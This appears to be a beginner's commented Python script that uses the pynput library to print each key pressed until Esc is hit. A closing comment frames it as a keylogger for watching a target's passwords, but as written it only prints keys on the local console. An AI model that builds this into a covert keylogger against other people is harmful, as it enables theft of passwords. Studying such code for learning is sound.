#!/bin/python3

# Import necessary modules
from pynput.keyboard import Listener, Key
#listener  and key are from pynput.keyboard library
#listener listens for keyboard events
#key this module contains special keys like esc,enter,space which we can use to identify and handle specific keys
# Function that is called when a key is pressed
def on_press(key):  #defines the function
    try:
        # Print the key pressed
        print(f"Key {key.char} pressed")  #key.char is for regular keys
    except AttributeError:
        # Handle special keys like space, enter, etc.
        print(f"Special key {key} pressed")

# Function that is called when the listener stops
def on_release(key):
    # Stop listener if 'esc' key is pressed
    if key == Key.esc:
        return False

# Collecting keystrokes
'''we create listerner object '''
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
#listener.join() starts the listener and keeps it running

'''
install a library  pynput 
keyloggers listen on a target to monitor passwords 
'''
